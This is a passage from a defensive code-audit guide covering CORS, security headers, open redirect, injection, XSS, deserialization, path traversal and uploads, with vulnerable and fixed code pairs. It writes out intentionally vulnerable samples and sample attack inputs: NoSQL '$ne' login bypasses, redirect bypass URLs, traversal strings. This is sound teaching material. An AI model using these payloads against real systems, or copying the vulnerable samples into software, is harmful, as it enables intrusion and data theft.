- `cors({ origin: true, credentials: true })`, or any handler that echoes `req.headers.origin` into `Access-Control-Allow-Origin` while also sending `Access-Control-Allow-Credentials: true`. That is a wildcard that *does* work with credentials.
- **Unanchored origin regexes.** `/trusted\.com/` matches `trusted.com.evil.com` and `nottrusted.com`. Anchor with `^https://([a-z0-9-]+\.)?trusted\.com$` and test the near misses.
- `Origin: null` accepted. A sandboxed iframe, a `data:` URL and some redirect chains all send it.
- Over-broad `Access-Control-Allow-Headers` / `-Methods`, and a long `Access-Control-Max-Age` that caches a permissive preflight.
- CORS is not authorization. `Access-Control-Allow-Origin` restricts who may *read* a cross-origin response in a browser; it does not stop the request from being sent, and it does nothing for a non-browser client. A finding phrased as "CORS prevents this" is wrong in the direction that matters.

```detector
match: |
  // src/server.ts
  app.use(
    cors({
      origin: true,
      credentials: true,
    }),
  )
nomatch: |
  // src/server.ts
  const ALLOWED = new Set(['https://app.example.com', 'https://admin.example.com'])

  app.use(
    cors({
      origin: (origin, cb) =>
        !origin || ALLOWED.has(origin) ? cb(null, origin ?? false) : cb(null, false),
      credentials: true,
      maxAge: 600,
    }),
  )
```

```detector
match: |
  # app/middleware/cors.py
  import re

  TRUSTED = re.compile(r"trusted\.com")

  def apply_cors(request, response):
      origin = request.headers.get("Origin", "")
      if TRUSTED.search(origin):
          response.headers["Access-Control-Allow-Origin"] = origin
          response.headers["Access-Control-Allow-Credentials"] = "true"
      return response
nomatch: |
  # app/middleware/cors.py
  import re

  TRUSTED = re.compile(r"^https://([a-z0-9-]+\.)?trusted\.com$")

  def apply_cors(request, response):
      origin = request.headers.get("Origin", "")
      if TRUSTED.fullmatch(origin):
          response.headers["Access-Control-Allow-Origin"] = origin
          response.headers["Access-Control-Allow-Credentials"] = "true"
          response.headers["Vary"] = "Origin"
      return response

  assert not TRUSTED.fullmatch("https://trusted.com.evil.com")
  assert not TRUSTED.fullmatch("https://nottrusted.com")
```

### 11. Security headers and CSP (`security-headers-and-csp`)

**Scope this to responses a browser renders as a document.** A JSON-only API gains nothing from a CSP, a `Referrer-Policy` or a COOP header, and filing those against it produces noise that trains a reader to dismiss the same finding on the server-rendered routes where it is real. Establish which routes return HTML — a template render, a JSX/SSR response, a static file server, an error page, a redirect interstitial, an OAuth callback page — and grade those.

For an HTML response:

- **CSP.** `default-src 'self'` is a floor, not a policy. `default-src` does not cover `base-uri`, `form-action` or `frame-ancestors`, so set those explicitly — `base-uri 'none'` blocks a base-tag injection that rewrites every relative script URL, and `frame-ancestors` is what actually replaces `X-Frame-Options`. `'unsafe-inline'` in `script-src` voids the policy for XSS purposes; `'unsafe-eval'` needs a named reason. A host-allowlist `script-src` is bypassable through JSONP endpoints and Angular versions hosted on the allowlisted origin — a nonce plus `'strict-dynamic'` is the construction that survives. Check `object-src 'none'` and, where the app posts to itself, `form-action 'self'`.
- **HSTS.** `Strict-Transport-Security: max-age=31536000; includeSubDomains`. Add `preload` only if the team intends to submit and can live with the consequences for every subdomain, forever. On an HTTP response the header is ignored, so this is a check on the HTTPS path.
- `X-Content-Type-Options: nosniff` — cheap, and it is what stops a user-uploaded file served with a wrong `Content-Type` from executing.
- `Referrer-Policy`. `strict-origin-when-cross-origin` is now the browser default, so its absence is **Info**, not Medium. It becomes a real finding only where the current policy is *weaker* than the default (`unsafe-url`, `no-referrer-when-downgrade`) or where a URL carries a token or an identifier and the route needs `no-referrer` — and that case is item 31.
- `Permissions-Policy` restricting features the app does not use; `Cross-Origin-Opener-Policy: same-origin` on pages that open windows or hold sensitive state; `Cross-Origin-Resource-Policy` on sensitive resources; `Cross-Origin-Embedder-Policy` only where cross-origin isolation is actually needed.
- Cookie attributes are item 8, not here.

```detector
match: |
  // src/server.ts
  app.use(
    helmet({
      contentSecurityPolicy: {
        directives: {
          defaultSrc: ["'self'"],
          scriptSrc: ["'self'", "'unsafe-inline'", "'unsafe-eval'", 'https://cdn.example.net'],
        },
      },
    }),
  )
nomatch: |
  // src/server.ts
  app.use((req, res, next) => {
    res.locals.cspNonce = crypto.randomBytes(16).toString('base64')
    next()
  })

  app.use(
    helmet({
      contentSecurityPolicy: {
        directives: {
          defaultSrc: ["'self'"],
          scriptSrc: [
            (req, res) => `'nonce-${res.locals.cspNonce}'`,
            "'strict-dynamic'",
          ],
          objectSrc: ["'none'"],
          baseUri: ["'none'"],
          formAction: ["'self'"],
          frameAncestors: ["'none'"],
        },
      },
      strictTransportSecurity: { maxAge: 31536000, includeSubDomains: true },
    }),
  )
```

```detector
match: |
  # nginx/site.conf
  server {
      listen 443 ssl;
      root /var/www/app;
      location / {
          try_files $uri $uri/ /index.html;
      }
  }
nomatch: |
  # nginx/site.conf
  server {
      listen 443 ssl;
      root /var/www/app;
      add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
      add_header X-Content-Type-Options "nosniff" always;
      add_header Referrer-Policy "strict-origin-when-cross-origin" always;
      location / {
          try_files $uri $uri/ /index.html;
      }
  }
```

### 12. Open redirect (`open-redirect`)

A caller-controlled destination reached through `res.redirect`, `HttpResponseRedirect`, `redirect_to`, `sendRedirect`, a `Location` header, a `<meta http-equiv="refresh">`, or a client-side `window.location = params.get('next')`.

The validation bypasses that matter, in the order they are missed:

- `//evil.example` and `/\evil.example` are protocol-relative and pass a `startsWith('/')` check.
- `https://trusted.example.evil.test` passes a `startsWith`/`includes` host check; `https://trusted.example@evil.test` passes a naive "contains the trusted host" check because everything before `@` is userinfo.
- Backslashes, tabs, newlines and percent-encoded separators are normalized differently by the validator and the browser: `https:/\evil.test`, `http:\\evil.test`, `%09//evil.test`.
- A validated relative path that the framework later resolves against a caller-controlled `Host` or `X-Forwarded-Host`.
- The redirect chain: an allowed first hop that itself redirects onward.

The durable fix is to not accept a URL at all — accept an opaque key and look the destination up in a server-side table — or to parse with the platform URL parser, require the scheme to be `https`, and require the host to be exactly equal to a member of an allowlist.

**Grade on what rides along.** A redirect that carries nothing is a phishing aid; a redirect reached inside an authentication or password-reset flow that forwards a code, a token or a session-bearing request is credential capture. OAuth `redirect_uri` exact-match validation is `oauth-oidc-flow-correctness` in crypto — hand that half over.

```detector
match: |
  // src/routes/auth.ts
  router.get('/login/callback', async (req, res) => {
    const next = String(req.query.next ?? '/')
    if (!next.startsWith('/')) return res.redirect('/')
    await establishSession(req, res)
    res.redirect(next)
  })
nomatch: |
  // src/routes/auth.ts
  const RETURN_TARGETS: Record<string, string> = {
    dashboard: '/dashboard',
    billing: '/settings/billing',
  }

  router.get('/login/callback', async (req, res) => {
    const target = RETURN_TARGETS[String(req.query.next ?? '')] ?? '/dashboard'
    await establishSession(req, res)
    res.redirect(target)
  })
```

```detector
match: |
  # app/views/redirect.py
  def go(request):
      target = request.GET.get("url", "/")
      if "trusted.example" in target:
          return HttpResponseRedirect(target)
      return HttpResponseRedirect("/")
nomatch: |
  # app/views/redirect.py
  from urllib.parse import urlparse

  ALLOWED_HOSTS = {"app.trusted.example", "docs.trusted.example"}

  def go(request):
      parsed = urlparse(request.GET.get("url", ""))
      if parsed.scheme == "https" and parsed.hostname in ALLOWED_HOSTS:
          return HttpResponseRedirect(parsed.geturl())
      return HttpResponseRedirect("/")
```

### 13. SQL, NoSQL and ORM injection (`injection-sql-nosql-orm`)

`A05:2025`. **This section is written out in full and delegates nothing to a central file**, because this lens is handed to an auditor who receives only this lens — a pointer elsewhere would deliver the highest-volume category in the domain as an empty section.

**The rule is parameterization, and the exceptions are positional.** A bound parameter can stand where a *value* stands. It cannot stand where an identifier, an operator or a keyword stands — table name, column name, `ORDER BY` target, sort direction, `LIMIT` in some drivers, a dynamic `IN` list built by string repetition. Those positions need an allowlist keyed to a literal set the code owns, or a coercion (`Number`, `int()`, `uuid.UUID`) that cannot carry syntax.

Where to look:

- **String building into a driver call.** Python f-strings and `%`-formatting inside `cursor.execute`, template literals inside `db.query`, `+` concatenation into `createQuery`, `String.format` into a JDBC statement, `#{}` versus `${}` in MyBatis — `${}` is textual substitution and is the injection.
- **ORM escape hatches.** Prisma `$queryRawUnsafe` and `$executeRawUnsafe`; Django `.extra(where=[...])`, `.raw()` and `RawSQL`; SQLAlchemy `text()` with an f-string; Rails `where("email = '#{x}'")` and `find_by_sql` — plus `order(params[:sort])` and `pluck(params[:col])`, which are **version-conditional and must not be stated flatly**: Rails 6 and later raise `ActiveRecord::UnknownAttributeReference` for raw SQL in these unless the code wraps it in `Arel.sql`, so on a supported Rails the finding is *the `Arel.sql` wrapper around caller text*, and the bare form is the finding only on Rails 5 and earlier. Read the version from the `Gemfile.lock` before writing either; Sequelize `sequelize.query` without `replacements`, and `Sequelize.literal`; Knex `whereRaw` and `orderByRaw`; Hibernate `createQuery` with concatenation; Entity Framework `FromSqlRaw` with interpolation (note the sibling `FromSqlInterpolated` *is* parameterized — read which one is called).
- **NoSQL operator injection.** A request field that reaches a query document as an *object* rather than a primitive carries operators with it, so `{ username: req.body.user, password: req.body.pass }` accepts `{"pass":{"$ne":null}}` and matches every document. **`req.body` under `express.json()` yields objects and arrays on every Express version** — that is the path to rely on. The query-string path is version-conditional: Express 4's default `extended` (qs) parser turns `?pass[$ne]=` into a nested object, and Express 5 changed the default `query parser` setting, so read the major and the app's own `app.set('query parser', …)` before asserting the `req.query` form. Coerce to a primitive at the boundary, or use `mongoose`'s `sanitizeFilter`. `$where`, `$function`, `mapReduce` and `$accumulator` execute JavaScript server-side and should not accept caller input at all.
- **Second-order injection.** A value stored safely with a bound parameter and later concatenated into a query by a different code path. The taint source is the database, not the request, and this is the case a review of the write path never finds.
- **`LIKE` wildcards.** Escaping quotes does not escape `%` and `_`. A caller who supplies `%` widens the predicate to everything, which is a data-exposure finding even when nothing is injected.

```detector
match: |
  # app/reports/queries.py
  def rows_for(conn, org_id, status, sort):
      sql = f"""
          SELECT id, title, amount, status
          FROM reports
          WHERE org_id = {org_id} AND status = '{status}'
          ORDER BY {sort}
      """
      with conn.cursor() as cur:
          cur.execute(sql)
          return cur.fetchall()
nomatch: |
  # app/reports/queries.py
  SORTABLE = {"created_at": "created_at", "amount": "amount", "title": "title"}

  def rows_for(conn, org_id, status, sort):
      column = SORTABLE.get(sort, "created_at")
      with conn.cursor() as cur:
          cur.execute(
              "SELECT id, title, amount, status FROM reports "
              "WHERE org_id = %s AND status = %s "
              f"ORDER BY {column} DESC",
              [org_id, status],
          )
          return cur.fetchall()
```

The safe form still interpolates — into the `ORDER BY`, from a dictionary the code owns, after a lookup that cannot return caller text. That is the shape to require, because "never interpolate" is advice no dynamic-sort feature can follow.

```detector
match: |
  // src/auth/login.ts
  const user = await db.collection('users').findOne({
    username: req.body.username,
    password: hash(req.body.password),
  })
  if (user) return issueSession(res, user)
nomatch: |
  // src/auth/login.ts
  const username = String(req.body.username ?? '')
  const password = String(req.body.password ?? '')
  const user = await db.collection('users').findOne({ username })
  if (user && (await verifyPassword(password, user.passwordHash))) {
    return issueSession(res, user)
  }
```

That pair is the operator-injection case, and it is worth being exact about *which* field is injectable in it — because the payload everyone quotes does not work against this sample. `hash()` turns the password into a string before it ever reaches Mongo, so `{"password":{"$ne":null}}` never arrives as an operator. **`username` is the injectable field here.** Sending `{"username":{"$ne":null},"password":"hunter2"}` builds the filter `{username: {$ne: null}, password: hash("hunter2")}`, which converts login into a *username-free password spray*: one guessed password authenticates as whichever account happens to use it. The classic no-password-at-all bypass — `{"username":"admin","password":{"$ne":null}}` — needs the password to reach the filter uncoerced, which is the neighbouring shape where the code compares a stored plaintext or a client-supplied hash taken straight from the body. Probe both fields; do not assume the password one from the presence of a login handler. `String()` at the boundary closes both, and comparing a hash inside the query is a second defect the safe form also removes.

```detector
match: |
  // src/reports/repo.ts
  const rows = await prisma.$queryRawUnsafe(
    `SELECT id, title FROM reports WHERE org_id = ${orgId} AND title ILIKE '%${q}%'`,
  )
nomatch: |
  // src/reports/repo.ts
  const rows = await prisma.$queryRaw`
    SELECT id, title FROM reports
    WHERE org_id = ${orgId} AND title ILIKE ${'%' + escapeLike(q) + '%'}
  `
```

### 14. Command and template injection (`injection-command-and-template`)

`A05:2025`, also inlined for the same reason.

**Command execution.** The finding is the shell, not the subprocess. `child_process.exec` and `execSync` spawn `/bin/sh`; `execFile` and `spawn` with an argument array do not. `subprocess.run(cmd, shell=True)` and `os.system` spawn a shell; a list argument vector does not. `Runtime.getRuntime().exec(String)` splits on whitespace with no quoting rules anyone expects, and `ProcessBuilder` with a list is the alternative. Two extra rules:

- **`shlex.quote` and friends protect the argument, not the command.** A quoted value placed where an *option* is parsed still reaches the program: `curl -- "$url"` is different from `curl "$url"`, and a value starting with `-` becomes a flag. Argument injection is a real finding class even with perfect shell quoting — `git`, `curl`, `ffmpeg`, `tar`, `rsync`, `find -exec` and `zip` all have flags that read or write arbitrary files.
- **An allowlist on the binary is not an allowlist on the arguments.** Both need one.
- **`--` is not universal, so do not prescribe it as a generic fix.** `curl`, `git`, `rm` and most GNU-convention tools honour it; ImageMagick's `convert` does not implement it and reads `--` as a filename operand. Where the tool does not support `--`, the protection is that the operand is a server-generated path rather than a caller string, plus whatever the tool's own policy mechanism offers (`policy.xml` for ImageMagick). Check the tool's own documentation before recommending `--` in a finding.

**Template and expression injection.** A template *compiled* from caller-controlled text is remote code execution in every mainstream engine, not merely an XSS: Jinja's `render_template_string`, Flask returning a f-string template, Handlebars `compile` on user text, Twig `createTemplate`, Freemarker and Velocity from a database column, Razor runtime compilation, Thymeleaf fragment expressions built from a request parameter, Spring's `SpelExpressionParser().parseExpression(userInput)` and `@Value` over caller data, Jakarta EL. Also `eval`, `new Function`, `vm.runInNewContext` (not a sandbox), `setTimeout` with a string, and `pickle`-adjacent evaluation in template filters.

**LDAP and XPath** round it out: `(&(uid=` plus caller text closes the filter; XPath string predicates concatenate the same way. Both have parameterized or escaping APIs; name the one used.

**Email header injection** is the same defect against a different grammar and is missed because the sink looks like a string field, not an interpreter. A newline or carriage return in a value interpolated into `To`, `Cc`, `Bcc`, `From`, `Reply-To` or `Subject` adds a header — an extra `Bcc` is silent exfiltration of every message the application sends. Reject `\r` and `\n` in any address or subject value, and prefer a mailer API that takes structured recipients over one that takes a header block.

```detector
match: |
  // src/media/thumbnail.ts
  import { exec } from 'node:child_process'

  export function thumbnail(inputPath: string, width: string) {
    return new Promise((resolve, reject) => {
      exec(`convert ${inputPath} -resize ${width} /tmp/out.png`, (err) =>
        err ? reject(err) : resolve('/tmp/out.png'),
      )
    })
  }
nomatch: |
  // src/media/thumbnail.ts
  import { execFile } from 'node:child_process'

  export function thumbnail(inputPath: string, width: number) {
    if (!Number.isInteger(width) || width < 1 || width > 4096) {
      throw new Error('bad width')
    }
    // no `--` here on purpose: ImageMagick does not implement the GNU
    // end-of-options convention and would treat `--` as a filename operand.
    // What bounds this call is the argv form, the validated width, a path
    // the server generated rather than the caller, and a policy.xml that
    // disables the coder set this app does not need.
    return new Promise((resolve, reject) => {
      execFile(
        'convert',
        [serverOwnedPath(inputPath), '-resize', String(width), '/tmp/out.png'],
        (err) => (err ? reject(err) : resolve('/tmp/out.png')),
      )
    })
  }
```

```detector
match: |
  # app/views/preview.py
  from flask import render_template_string, request

  @bp.get("/preview")
  def preview():
      subject = request.args.get("subject", "")
      return render_template_string(
          f"<h1>Preview</h1><p>Subject: {subject}</p>"
      )
nomatch: |
  # app/views/preview.py
  from flask import render_template, request

  @bp.get("/preview")
  def preview():
      # the template is a file the application owns; the caller supplies a
      # value that is escaped by autoescaping, never template source
      return render_template("preview.html", subject=request.args.get("subject", ""))
```

### 15. Cross-site scripting and output encoding (`xss-and-output-encoding`)

`A05:2025`, inlined. **Encoding is contextual; a single "sanitize" step is not a control.** The same string is safe in an HTML text node, dangerous in an attribute, dangerous in a URL position, and dangerous inside a `<script>` block, and the escaping differs in each.

The five contexts, and what each needs:

1. **HTML text.** Framework autoescaping handles it. The finding is the opt-out.
2. **Attribute.** Autoescaping usually handles quoted attributes; an *unquoted* attribute in a hand-built string is escapable with a space, and an event-handler attribute (`onclick`) is a JavaScript context wearing an attribute's clothes.
3. **URL.** `href={value}` and `src={value}` take a scheme from the caller, and encoding does nothing about it — the scheme must be checked against an allowlist of `https:`, `http:`, `mailto:` and relative paths. **`javascript:` is the live path** and is the one to hunt. Two others are worth recognising but are illustrations rather than exploits today: `data:text/html` is blocked for top-level navigation in all current browsers, and `vbscript:` was Internet Explorer only and is dead. Do not build a finding on either; build it on `javascript:`, on an allowlist that is absent, or on one that checks a prefix instead of the parsed scheme.
4. **JavaScript.** Data interpolated into an inline `<script>` must not be able to emit `</script>`, `<!--` or `<script`, and HTML-escaping is the wrong tool. Serialize with a JSON encoder that escapes `<`, `>` and `&`, or — better — put the data in `<script type="application/json">` and `JSON.parse` its `textContent`.
5. **CSS.** A `style` attribute or a style block built from caller input exfiltrates through `background: url(...)` and attribute selectors.

Opt-outs to enumerate: `dangerouslySetInnerHTML`, `innerHTML` / `outerHTML` / `insertAdjacentHTML` / `document.write`, Vue `v-html`, Angular `bypassSecurityTrustHtml` / `bypassSecurityTrustUrl` / `bypassSecurityTrustResourceUrl`, Svelte `{@html}`, Jinja `|safe` and `{% autoescape false %}`, Django `mark_safe` and `|safe`, ERB `raw` and `.html_safe`, Handlebars `{{{ }}}`, Razor `Html.Raw`, Go `template.HTML` (which converts a string to trusted-HTML by *type*, so a grep for it finds every bypass), Thymeleaf `th:utext`.

**Angular `[innerHTML]` is not on that list, and putting it there is a false positive.** Angular sanitizes `[innerHTML]` through `DomSanitizer` by default, so idiomatic `[innerHTML]="value"` strips scripts and event handlers and the team is right to reject the finding. The Angular opt-out is a `bypassSecurityTrust*` call; the finding is that call, or an `[innerHTML]` bound to a value some `bypassSecurityTrust*` already marked trusted. Trace the binding to its producer before writing it up.

DOM XSS is its own sweep: sources are `location.hash`, `location.search`, `document.referrer`, `window.name`, `postMessage` data and a `localStorage` value another script wrote; sinks are the list above plus `eval`, `setTimeout(string)`, `Function`, `element.setAttribute('href'|'src'|'srcdoc', ...)`, `jQuery.html()` and `$(selectorFromInput)`.

**On sanitizers.** DOMPurify is the right library and it is defeated by the way it is configured and used: `ADD_ATTR` or `ADD_TAGS` re-admitting `on*` handlers or `<svg>`/`<math>`, a relaxed `ALLOWED_URI_REGEXP`, running it server-side without a DOM implementation so it silently returns the input, and — the common one — **mutating the DOM after sanitizing**, which reintroduces mXSS. Sanitize last, assign once.

```detector
match: |
  // src/components/Comment.tsx
  export function Comment({ body }: { body: string }) {
    return <div className="comment" dangerouslySetInnerHTML={{ __html: body }} />
  }
nomatch: |
  // src/components/Comment.tsx
  import DOMPurify from 'dompurify'

  export function Comment({ body }: { body: string }) {
    // rendered as text unless the product genuinely needs rich text; where it
    // does, sanitize immediately before the assignment and do not touch the
    // node afterwards
    const clean = DOMPurify.sanitize(body, { USE_PROFILES: { html: true } })
    return <div className="comment" dangerouslySetInnerHTML={{ __html: clean }} />
  }
```

```detector
match: |
  // src/components/ProfileLink.tsx
  export function ProfileLink({ url, label }: { url: string; label: string }) {
    return <a href={url}>{label}</a>
  }
nomatch: |
  // src/components/ProfileLink.tsx
  const SAFE_SCHEMES = new Set(['http:', 'https:', 'mailto:'])

  function safeHref(raw: string): string {
    // one leading slash followed by something that is neither / nor \ —
    // `startsWith('/') && !startsWith('//')` is NOT enough, because browsers
    // normalize the backslash and `/\evil.example` is protocol-relative
    if (/^\/[^/\\]/.test(raw)) return raw
    try {
      const u = new URL(raw)
      return SAFE_SCHEMES.has(u.protocol) ? u.toString() : '#'
    } catch {
      return '#'
    }
  }

  export function ProfileLink({ url, label }: { url: string; label: string }) {
    return <a href={safeHref(url)} rel="noopener noreferrer">{label}</a>
  }
```

```detector
match: |
  <!-- templates/dashboard.html -->
  <script>
    window.__BOOTSTRAP__ = {{ bootstrap_json|safe }};
  </script>
nomatch: |
  <!-- templates/dashboard.html -->
  <script id="bootstrap" type="application/json">{{ bootstrap_json }}</script>
  <script>
    window.__BOOTSTRAP__ = JSON.parse(
      document.getElementById('bootstrap').textContent,
    );
  </script>
```

### 16. Deserialization and XXE (`deserialization-and-xxe`)

`A08:2025`, inlined.

**Object deserialization of caller-controlled bytes is remote code execution** in every language that supports it, and no allowlist of "safe classes" is safe unless it is an allowlist. The sinks: Python `pickle.loads` (including anything that wraps it — `joblib.load`, `torch.load` on an old version, a cache or session backend configured with the pickle serializer, a Celery broker accepting the `pickle` content type) and `yaml.load` with an unsafe loader — state that one carefully, because PyYAML 6 made the `Loader` argument mandatory and a bare `yaml.load(data)` no longer runs: the live sinks are `yaml.load(data, Loader=yaml.Loader)` and `UnsafeLoader`, while `FullLoader` is not remote code execution and `safe_load` is the fix. Read the pinned PyYAML version rather than filing every `yaml.load` on sight; Java `ObjectInputStream.readObject` and `XMLDecoder`, plus the frameworks that hide it — JMS object messages, RMI, some caches; .NET `BinaryFormatter` — obsoleted and disabled by default in recent .NET, so on a current target-framework the finding is the *re-enabling* switch or the legacy framework it still runs on, and it remains a correct sink on .NET Framework — along with `LosFormatter`, `NetDataContractSerializer`, `SoapFormatter`, and `Json.NET` with `TypeNameHandling` set to anything but `None`; PHP `unserialize` on request data (and the `phar://` stream wrapper, which deserializes metadata on a filesystem operation); Ruby `Marshal.load`, and `YAML.load` — whose default became safe loading in Psych 4, so read the Ruby version before grading rather than assuming either way.

The rule to write in the finding: **the format is the fix.** Replace the object format with a data format — JSON, MessagePack, protobuf — parsed into a declared schema. A signature over a pickle blob narrows who can trigger it and does not make deserialization safe.

**XXE.** An XML parser that resolves external entities turns any XML input — including SOAP, SAML, SVG, DOCX/XLSX, RSS, and an XML-shaped content type on a JSON endpoint — into arbitrary local-file read and a request-forgery primitive. Also check for the billion-laughs expansion.

- **Java is the stable case, but there is no single hardening recipe — the four factories do not share an API, and a block copied from one to another throws at runtime.** Write the per-factory form into the finding:
  - **`DocumentBuilderFactory`** — `setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true)`, `setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)`, both `http://xml.org/sax/features/external-general-entities` and `external-parameter-entities` to `false`, `setXIncludeAware(false)`, `setExpandEntityReferences(false)`. This is the only factory the whole set applies to, and it is the one the detector below demonstrates.
  - **`SAXParserFactory`** — the same three feature URIs and `setXIncludeAware(false)`. It has **no** `setExpandEntityReferences`; that method is `DocumentBuilderFactory`-only.
  - **`XMLInputFactory`** (StAX) — configured through `setProperty`, not `setFeature`: `setProperty(XMLInputFactory.SUPPORT_DTD, false)` and `setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, false)`. The SAX feature URIs, `setXIncludeAware` and `setExpandEntityReferences` do not exist here.
  - **`TransformerFactory`** — `setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true)` plus `setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, "")` and `setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, "")`. `disallow-doctype-decl` is a Xerces *parser* feature and is **not** recognised here; `TransformerFactory.setFeature` rejects an unrecognised feature name rather than ignoring it, so recommending it produces a remediation that fails when applied.

  Do not write a uniform four-factory prescription into a report. Name the factory that is actually constructed in the code you read, and give that factory's own settings.
- **Do not grade Python, .NET or PHP from memory.** The defaults for `xml.etree.ElementTree`, `lxml`, `xml.dom.minidom`, `XmlReader`/`XmlDocument` and libxml2 have each changed across versions, in both directions. Name the parser, name the version from the lockfile, and name the explicit hardening flag you found or did not find. Where the version is unpinned, that is the finding to write. In Python, the durable recommendation is `defusedxml`.
- **A specific dead check, so nobody files it:** `libxml_disable_entity_loader()` is deprecated in PHP 8 and external entity loading is already off by default in current libxml2, so its absence in a modern PHP codebase is not a finding. The live smell is a parse call passing `LIBXML_NOENT`, which turns entity substitution back *on* despite reading like "no entities".

```detector
match: |
  # app/api/import.py
  import pickle, base64

  @bp.post("/import/state")
  def import_state():
      blob = base64.b64decode(request.get_data())
      state = pickle.loads(blob)
      apply_state(state)
      return "", 204
nomatch: |
  # app/api/import.py
  from pydantic import BaseModel

  class ImportState(BaseModel):
      version: int
      rows: list[dict[str, str]]

  @bp.post("/import/state")
  def import_state():
      state = ImportState.model_validate_json(request.get_data())
      apply_state(state)
      return "", 204
```

```detector
match: |
  // src/main/java/com/example/ImportService.java
  DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
  DocumentBuilder db = dbf.newDocumentBuilder();
  Document doc = db.parse(new InputSource(new StringReader(payload)));
nomatch: |
  // src/main/java/com/example/ImportService.java
  DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
  dbf.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
  dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
  dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
  dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
  dbf.setXIncludeAware(false);
  dbf.setExpandEntityReferences(false);
  DocumentBuilder db = dbf.newDocumentBuilder();
  Document doc = db.parse(new InputSource(new StringReader(payload)));
```

### 17. Path traversal and file access (`path-traversal-and-file-access`)

A caller-influenced path reaching the filesystem. The sinks are ordinary — `open`, `readFile`, `sendFile`, `File`, `os.Open` — and the bugs are in the joining.

- **`os.path.join` discards the base when the second argument is absolute.** `os.path.join("/srv/files", "/etc/passwd")` is `"/etc/passwd"`. This is the single most commonly missed detail in Python file handling; the same is true of `Path("/srv/files") / "/etc/passwd"`, and of `filepath.Join` only after a `..` walk rather than an absolute prefix.
- **`filepath.Join` and `path.join` normalize, they do not confine.** They collapse `..` and hand back a path outside the root. Resolve to an absolute real path and assert the prefix — with a separator — or use a confinement API such as Go's `filepath.IsLocal` check before joining.
- **Decode once, then validate.** A router that URL-decodes and an application that decodes again turn `%252e%252e%252f` into `../`. Reject encoded separators rather than decoding in a loop.
- **Windows and archive variants**: backslash separators, drive letters, UNC paths, alternate data streams, and Zip Slip — an archive entry named `../../etc/cron.d/x` extracted with the entry name joined to a destination.
- **Symlinks and TOCTOU.** Validate the resolved path and then open *that* path, or open with `O_NOFOLLOW`; a `realpath` check followed by an `open` of the original string is a race.
- **Static roots.** In nginx, `location /static { alias /var/www/static; }` with no trailing slash on either side lets `/static../` escape the alias; `express.static` with `dotfiles: 'allow'` serves `.env` and `.git`; `res.sendFile(p)` without the `root` option accepts an absolute path.

```detector
match: |
  # app/files/views.py
  import os
  from flask import send_file

  UPLOAD_ROOT = "/srv/uploads"

  @bp.get("/files/<path:name>")
  def download(name):
      return send_file(os.path.join(UPLOAD_ROOT, name))
nomatch: |
  # app/files/views.py
  import os
  from flask import send_file, abort

  UPLOAD_ROOT = os.path.realpath("/srv/uploads")

  @bp.get("/files/<path:name>")
  def download(name):
      candidate = os.path.realpath(os.path.join(UPLOAD_ROOT, name))
      if not candidate.startswith(UPLOAD_ROOT + os.sep):
          abort(404)
      return send_file(candidate)
```

```detector
match: |
  // src/archive/extract.ts
  import AdmZip from 'adm-zip'

  export function extract(zipPath: string, dest: string) {
    const zip = new AdmZip(zipPath)
    for (const entry of zip.getEntries()) {
      zip.extractEntryTo(entry, dest, true, true)
    }
  }
nomatch: |
  // src/archive/extract.ts
  import AdmZip from 'adm-zip'
  import path from 'node:path'

  export function extract(zipPath: string, dest: string) {
    const root = path.resolve(dest)
    const zip = new AdmZip(zipPath)
    for (const entry of zip.getEntries()) {
      const target = path.resolve(root, entry.entryName)
      if (target !== root && !target.startsWith(root + path.sep)) {
        throw new Error(`zip slip: ${entry.entryName}`)
      }
      zip.extractEntryTo(entry, path.dirname(target), false, true)
    }
  }
```

### 18. File upload handling (`file-upload-handling`)

Four decisions, and each is independently exploitable.

- **What is accepted.** The client's `Content-Type` and the filename extension are both caller-controlled. Sniff the content, and even then treat "it parsed as a PNG" as weak — polyglots exist. An allowlist of extensions *and* a content check *and* re-encoding the image is the strong form.
- **Where it is stored.** Not inside the document root, not on a path derived from the caller's filename, and ideally not on the application origin at all. A file served from the same origin as the app runs in that origin if it can be made to execute.
- **What it is named.** Generate the storage name; keep the original only as a display attribute. This removes traversal, overwriting `.htaccess`/`web.config`/`index.php`, null-byte and double-extension tricks in one move.
- **How it is served back.** `Content-Type` from a server-side allowlist, `X-Content-Type-Options: nosniff`, and `Content-Disposition: attachment` for anything not explicitly renderable. **SVG is a script-bearing document**: served inline from the app origin it is stored XSS, and an image allowlist that includes `image/svg+xml` is the usual delivery.
- Plus: a maximum size enforced before buffering, a decompression-bomb guard on any archive or image resize, and a scan or quarantine step where the file will be handed to another system.
- **Reflected file download** is the download-side sibling and it is missed because no upload is involved: a route that sets `Content-Disposition` with a caller-controlled `filename`, or that lets the caller choose a path extension, can serve an API response as `report.bat` or `setup.cmd` from the application's own domain. Generate the filename server-side, or quote and strictly filter it, and keep the response's `Content-Type` off the executable list.

```detector
match: |
  // src/routes/upload.ts
  import multer from 'multer'

  const upload = multer({ dest: 'public/uploads/' })

  router.post('/upload', requireAuth, upload.single('file'), (req, res) => {
    const dest = path.join('public/uploads', req.file.originalname)
    fs.renameSync(req.file.path, dest)
    res.json({ url: `/uploads/${req.file.originalname}` })
  })
nomatch: |
  // src/routes/upload.ts
  import multer from 'multer'
  import { fileTypeFromFile } from 'file-type'

  const ALLOWED = new Map([
    ['image/png', 'png'],
    ['image/jpeg', 'jpg'],
  ])

  const upload = multer({
    dest: '/var/app/incoming/',
    limits: { fileSize: 5 * 1024 * 1024, files: 1 },
  })

  router.post('/upload', requireAuth, upload.single('file'), async (req, res) => {
    const sniffed = await fileTypeFromFile(req.file.path)
    const ext = sniffed && ALLOWED.get(sniffed.mime)
    if (!ext) {
      await fs.promises.unlink(req.file.path)
      return res.status(415).json({ error: 'unsupported type' })
    }
    const key = `${crypto.randomUUID()}.${ext}`
    await objectStore.put(key, req.file.path, {
      contentType: sniffed.mime,
